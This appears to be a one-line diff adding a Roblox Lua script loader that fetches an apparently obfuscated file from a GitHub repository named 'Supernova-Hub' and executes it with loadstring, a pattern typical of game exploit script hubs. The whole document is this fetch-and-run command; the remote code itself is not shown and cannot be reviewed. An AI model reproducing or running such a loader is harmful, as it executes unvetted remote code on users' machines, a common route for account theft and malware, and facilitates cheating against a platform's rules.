@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Divinity222/Supernova-Hub/main/Protected_4545908850709336.lua'))() 
